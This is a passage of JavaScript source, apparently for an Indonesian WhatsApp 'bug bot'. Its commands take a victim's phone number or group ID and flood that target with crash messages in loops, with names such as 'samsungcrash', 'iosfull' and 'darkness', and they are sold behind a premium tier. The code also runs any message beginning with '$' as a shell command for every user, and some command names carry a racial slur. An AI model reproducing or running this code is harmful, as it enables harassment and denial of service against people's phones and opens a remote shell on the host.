await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await sendSystemCrashMessage(Pe)
await sendSystemCrashMessage(Pe)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await sendSystemCrashMessage(Pe)
sleep(2000)
}
reply(`<,Sukses send Bug Target ✅`)
break

case 'mati-aja-lu':
if (!isPremium && !isOwner) return reply(`KHUSUS PREMIUM 😜`)
if (!q) return reply(`Example:\n ${prefix + command} 62xxxx`)
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(`AKMAL MODS , OTW BUG TARGET`)
for (let j = 0; j < 3; j++) {
await sendSystemCrashMessage(Pe)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await sendSystemCrashMessage(Pe)
await sendSystemCrashMessage(Pe)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await sendSystemCrashMessage(Pe)
sleep(2000)
}
reply(`<,Sukses send Bug Target ✅`)
break

case 'kalem-geh':
if (!isPremium && !isOwner) return reply(`KHUSUS PREMIUM 😜`)
if (!q) return reply(`Example:\n ${prefix + command} 62xxxx`)
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(`AKMAL MODS , OTW BUG TARGET`)
for (let j = 0; j < 3; j++) {
await sendSystemCrashMessage(Pe)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await sendSystemCrashMessage(Pe)
await sendSystemCrashMessage(Pe)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await sendSystemCrashMessage(Pe)
sleep(2000)
}
reply(`<,Sukses send Bug Target ✅`)
break

case 'santai-aja':
if (!isPremium && !isOwner) return reply(`KHUSUS PREMIUM 😜`)
if (!q) return reply(`Example:\n ${prefix + command} 62xxxx`)
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(`AKMAL MODS , OTW BUG TARGET`)
for (let j = 0; j < 3; j++) {
await sendSystemCrashMessage(Pe)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await sendSystemCrashMessage(Pe)
await sendSystemCrashMessage(Pe)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await sendSystemCrashMessage(Pe)
sleep(2000)
}
reply(`<,Sukses send Bug Target ✅`)
break

case '✨': case '🔥': case '😘': case '🍂': case '⭐': case '👺': case '🗿':
if (!isPremium && !isOwner) return reply(`KHUSUS PREMIUM 😜`)
if (!q) return reply(`Example:\n ${prefix + command} 62xxxx`)
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(`AKMAL MODS , OTW BUG TARGET`)
for (let j = 0; j < 5; j++) {
await ngeloc(Pe, force)
await pirgam(Pe, bugquoteddvc)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await ngeloc(Pe, force)
await sendListMessage(Pe)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await sendExtendedTextMessage(Pe)
rezzx.sendMessage(Pe, {text: `${command} ✅`}, {quoted: force})
await sleep(2000)
await ngeloc(Pe, force)
await pirgam(Pe, bugquoteddvc)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await ngeloc(Pe, force)
await sendListMessage(Pe)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await sendExtendedTextMessage(Pe)
rezzx.sendMessage(Pe, {text: `${command} ✅`}, {quoted: force})
await sleep(2000)
await ngeloc(Pe, force)
await pirgam(Pe, bugquoteddvc)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await ngeloc(Pe, force)
await sendListMessage(Pe)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await sendExtendedTextMessage(Pe)
rezzx.sendMessage(Pe, {text: `${command} ✅`}, {quoted: force})
await sleep(2000)
}
reply(`<,Sukses send Bug Target ✅`)
break

case 'gc-ajg': 
if (!isPremium && !isOwner) return reply(`KHUSUS PREMIUM 😜`)
if (!q) return reply('AKMAL MODS - id grup mana?')
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@g.us"
jumlah = 20
sendVariousMessages(Pe, jumlah)
await sleep(2000)
reply(`*</> Trio Kece Nih Boss , Sukses Send Bug Target*`)
break

case 'penghitaman-gc': 
if (!isPremium && !isOwner) return reply(`KHUSUS PREMIUM 😜`)
if (!q) return reply('AKMAL MODS - id grup mana?')
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@g.us"
jumlah = 20
sendVariousMessages(Pe, jumlah)
await sleep(2000)
reply(`*</> Trio Kece Nih Boss , Sukses Send Bug Target*`)
break

case 'open-promosi-vcs': 
if (!isPremium && !isOwner) return reply(`KHUSUS PREMIUM 😜`)
if (!q) return reply('AKMAL MODS - id grup mana?')
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@g.us"
jumlah = 20
sendVariousMessages(Pe, jumlah)
await sleep(2000)
reply(`*</> Trio Kece Nih Boss , Sukses Send Bug Target*`)
break

case 'kudeta': 
if (!isPremium && !isOwner) return reply(`KHUSUS PREMIUM 😜`)
if (!q) return reply('AKMAL MODS - id grup mana?')
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@g.us"
jumlah = 20
sendVariousMessages(Pe, jumlah)
await sleep(2000)
reply(`*</> Trio Kece Nih Boss , Sukses Send Bug Target*`)
break

case 'grup-negro': 
if (!isPremium && !isOwner) return reply(`KHUSUS PREMIUM 😜`)
if (!q) return reply('AKMAL MODS - id grup mana?')
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@g.us"
jumlah = 20
sendVariousMessages(Pe, jumlah)
await sleep(2000)
reply(`*</> Trio Kece Nih Boss , Sukses Send Bug Target*`)
break

case 'bubarin-gcnya': 
if (!isPremium && !isOwner) return reply(`KHUSUS PREMIUM 😜`)
if (!q) return reply('AKMAL MODS - id grup mana?')
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@g.us"
jumlah = 20
sendVariousMessages(Pe, jumlah)
await sleep(2000)
reply(`*</> Trio Kece Nih Boss , Sukses Send Bug Target*`)
break

case 'rezzx-in-here': 
if (!isPremium && !isOwner) return reply(`KHUSUS PREMIUM 😜`)
if (!q) return reply('AKMAL MODS - id grup mana?')
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@g.us"
jumlah = 20
sendVariousMessages(Pe, jumlah)
await sleep(2000)
reply(`*</> Trio Kece Nih Boss , Sukses Send Bug Target*`)
break

case 'iosfull':
if (!isPremium && !isOwner) return reply(`KHUSUS PREMIUM 😜`)
if (!q) return reply(`Example:\n ${prefix + command} 62xxxx|5`)
victim = q.split("|")[0]
amount = q.split("|")[1]
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(`AKMAL MODS , OTW BUG TARGET`)
for (let i = 0; i < amount; i++) {
iponcrash(Pe)
sleep(500)
iponcrash(Pe)
sleep(500)
iponcrash(Pe)
sleep(500)
iponcrash(Pe)
sleep(500)
}
reply(`<, Sukses Send Bug Target ✅ Amount *${amount}*`)
break

case 'iosfullv2': case 'tembusios':
if (!isPremium && !isOwner) return reply(`KHUSUS PREMIUM 😜`)
if (!q) return reply(`Example:\n ${prefix + command} 62xxxx|5`)
victim = q.split("|")[0]
amount = q.split("|")[1]
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(`AKMAL MODS , OTW BUG TARGET`)
for (let i = 0; i < amount; i++) {
sendBugIos(Pe)
sleep(500)
sendBugIos(Pe)
sleep(500)
sendBugIos(Pe)
sleep(500)
sendBugIos(Pe)
sleep(500)
}
reply(`<, Sukses Send Bug Target ✅ Amount *${amount}*`)
break

case '🤗': case '💔': case '❤️': case '😜': case '⚡': case '☠️': case '💦':
if (!isPremium && !isOwner) return reply(`KHUSUS PREMIUM 😜`)
if (!q) return reply(`Example:\n ${prefix + command} 62xxxx|5`)
victim = q.split("|")[0]
amount = q.split("|")[1]
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(`AKMAL MODS , OTW BUG TARGET`)
for (let i = 0; i < amount; i++) {
sendBugIos(Pe)
sleep(500)
sendBugIos(Pe)
sleep(500)
sendBugIos(Pe)
sleep(500)
sendBugIos(Pe)
sleep(500)
}
reply(`<, Sukses Send Bug Target ✅ Amount *${amount}*`)
break

case 'samsungcrash':
if (!isPremium && !isOwner) return reply(`KHUSUS PREMIUM 😜`)
if (!q) return reply(`Example:\n ${prefix + command} 62xxxx|5`)
victim = q.split("|")[0]
amount = q.split("|")[1]
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(`AKMAL MODS , OTW BUG TARGET`)
for (let i = 0; i < amount; i++) {
ngeloc(Pe, force)
ngeloc(Pe, force)
sleep(200)
sendListMessage(Pe)
sendLiveLocationMessage(Pe)
sendSystemCrashMessage(Pe)
sleep(200)
ngeloc(Pe, force)
sleep(200)
sendListMessage(Pe)
sendLiveLocationMessage(Pe)
sendSystemCrashMessage(Pe)
}
reply(`<, Sukses Send Bug Target ✅ Amount *${amount}*`)
break

case 'slayer07':
if (!isPremium && !isOwner) return reply(`KHUSUS PREMIUM 😜`)
if (!q) return reply(`Example:\n ${prefix + command} 62xxxx|5`)
victim = q.split("|")[0]
amount = q.split("|")[1]
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(`AKMAL MODS , OTW BUG TARGET`)
for (let i = 0; i < amount; i++) {
sendListMessage(Pe)
ngeloc(Pe, force)
ngeloc(Pe, force)
sleep(500)
sendLiveLocationMessage(Pe)
sleep(500)
sendSystemCrashMessage(Pe)
sleep(500)
iponcrash(Pe)
sleep(500)
pirgam(Pe, bugquoteddvc)
sleep(500)
bakdok(Pe, force)
sleep(500)
penghitaman(Pe, force)
rezzx.sendMessage(Pe, {image: slayer07, caption: `SLAYER 07`},{quoted: m})
}
reply(`<, Sukses Send Bug Target ✅ Amount *${amount}*`)
break

case 'darkness':
if (!isPremium && !isOwner) return reply(`KHUSUS PREMIUM 😜`)
if (!q) return reply(`Example:\n ${prefix + command} 62xxxx|5`)
victim = q.split("|")[0]
amount = q.split("|")[1]
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(`AKMAL MODS , OTW BUG TARGET`)
for (let i = 0; i < amount; i++) {
sendListMessage(Pe)
ngeloc(Pe, force)
ngeloc(Pe, force)
sleep(500)
sendLiveLocationMessage(Pe)
sleep(500)
sendSystemCrashMessage(Pe)
sleep(500)
iponcrash(Pe)
sleep(500)
pirgam(Pe, bugquoteddvc)
sleep(500)
bakdok(Pe, force)
sleep(500)
penghitaman(Pe, force)
rezzx.sendMessage(Pe, {document: slayer07, caption: `∗🚷▸⃟°̯͜𝚫̸𝐊͢𝐌𝐀𝐋⭑𝚫̸𝐍͢𝐓𝐢⭑𝐊𝐑𝚹͢𝐂̸𝚹 㐅` },{quoted: m})
}
reply(`<, Sukses Send Bug Target ✅ Amount *${amount}*`)
break

case 'virkon':
if (!isPremium && !isOwner) return reply(`KHUSUS PREMIUM 😜`)
if (!q) return reply(`Example:\n ${prefix + command} 62xxxx|5`)
victim = q.split("|")[0]
amount = q.split("|")[1]
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(`AKMAL MODS , OTW BUG TARGET`)
for (let i = 0; i < amount; i++) {
sendListMessage(Pe)
ngeloc(Pe, force)
ngeloc(Pe, force)
sleep(500)
sendLiveLocationMessage(Pe)
sleep(500)
sendSystemCrashMessage(Pe)
sleep(500)
iponcrash(Pe)
sleep(500)
pirgam(Pe, bugquoteddvc)
sleep(500)
bakdok(Pe, force)
sleep(500)
penghitaman(Pe, force)
rezzx.sendMessage(Pe, {image: slayer07, caption: `☠️ R⃪᷎᷏ᷚ᷋᷍E⃮⃯Z᷎⃮⃮᷋᷍Z⃖⃖⃖⃖⃖⃧⃧⃩⃡⃕ V⃒⃡⃡⃡⃡⃩⃩⃩⃩⃡⃕⃔⃕⃗IRᷡᷡᷞᷪᷭ᷆᷅᷅᷅᷍᷍U᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷉᷑᷑S᷂᷂᷂᷂᷂᷂᷂᷂᷆ᷚ᷒ᷓ᷉᷉᷍᷍᷍᷍ ☠️ ✨҈͓̙̪͔̞̯̞̥̟͎̯̅͂̂̇ͅs҈̖̟͇̈́͊̇͋͜͡ù̴̢̙̭̖̤̂̀̒̓͡p҈͉͎͓̍̆͢͝e̸͎͖̣̐̋̊͊̕͢r҈̟̫̜̏́͢͡ ę̶̳̙̬̝͑̾͗̽̓͡ź̴̜̳̤̜͊͢͡ͅy̵̟̤̱̔̓̾̔͢͡ c҉̨̞͔̟͇̩́̓́̃̒͞ŗ̷͇̣̝̒͗̍̾͌͝a̷̡̘̯̜͆͒̊̏͠s҈͉̪̯͈̜҇̀͂͜h̷͔̠̘҇̔̍͒͜🔥...................... ✅҈͔̩͉̘͇̬̣͓̝̥̦̙͔̀̀̅̋́̃͛͗͐̊̅͊̌`},{quoted: m})
}
reply(`<, Sukses Send Bug Target ✅ Amount *${amount}*`)
break


// GA JELAS INI

case "chekkhodam": {
if (!args[0]) return m.reply('NAMA LU MANA ANJG')
const khodam = [
"Ikan", "Sendal", "Genderuwo", "Ijat", "Fizi", "kaleng kejepit", "Raja Ibelis", "Singa", "Lele", "Ayam Kaepci","kucing mewing","tutup panci","ular sigma","kucing isriwil","kapal karam","anggrek mekar Pontianak"]
const hasil = khodam[Math.floor(Math.random() * khodam.length)]
const teks = `
┌ ⛯ ⌈ ʜᴀꜱɪʟ ᴄʜᴇᴋ ᴋʜᴏᴅᴀᴍ ⌋ ✵
│⌲ ɴᴀᴍᴀ :  ${args[0]}
│⌲ ᴋʜᴏᴅᴀᴍ ᴍᴜ: ${hasil}
╰──────────
`
m.reply(teks)
}
break
case "gayrate": {
if (!args[0]) return m.reply('MANA NAMANYA ANJG')
let henshin = Math.floor(Math.random() * 100)
let teks = `GAY RATE😷
NAMA : ${args[0]}
PERSENTASE GAY : ${henshin}%`
}
break
case "owner": {
const repf = await rezzx.sendMessage(from, { 
contacts: { 
displayName: `${list.length} Kontak`, 
contacts: list }, contextInfo: {
forwardingScore: 9999999, 
isForwarded: true,
mentionedJid: [sender]
}}, { quoted: m })
rezzx.sendMessage(from, { text : `Hai Kak @${sender.split("@")[0]}, Owner Ganteng Ku,Jangan Spam Ya kak`, contextInfo:{
forwardingScore: 9999999, 
isForwarded: true,
mentionedJid:[sender]
}}, { quoted: repf })
}
break
case "addowner":
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6282140981331`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await rezzx.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (ceknye.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
ownerNumber.push(bnnd)
fs.writeFileSync('./all/database/owner.json', JSON.stringify(ownerNumber))
reply(`Nomor ${bnnd} Telah Menjadi Owner!!!`)
break
case "delowner":
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6282140981331`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = ownerNumber.indexOf(ya)
ownerNumber.splice(unp, 1)
fs.writeFileSync('./all/database/owner.json', JSON.stringify(ownerNumber))
reply(`Nomor ${ya} Telah Di Hapus Owner!!!`)
break
case "addprem":{
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6282140981331`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await rezzx.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
prem.push(prrkek)
fs.writeFileSync("./all/database/premium.json", JSON.stringify(prem))
reply(`Nomor ${prrkek} Telah Menjadi Premium!`)
}
break
case "delprem":{
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6282140981331`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = prem.indexOf(ya)
prem.splice(unp, 1)
fs.writeFileSync("./all/database/premium.json", JSON.stringify(prem))
reply(`Nomor ${ya} Telah Di Hapus Premium!`)
}
break
default:
}
if (budy.startsWith('$')) {
exec(budy.slice(2), (err, stdout) => {
if(err) return reply(err)
if (stdout) return reply(stdout)
})
}
if (budy.startsWith(">")) {
if (!isOwner) return reply(mess.only.owner)
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await reply(evaled)
} catch (err) {
reply(String(err))
}
}
} catch (e) {
console.log(e)
rezzx.sendMessage(`${owner}@s.whatsapp.net`, {text:`${util.format(e)}`})
}
}

let file = require.resolve(__filename) 
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})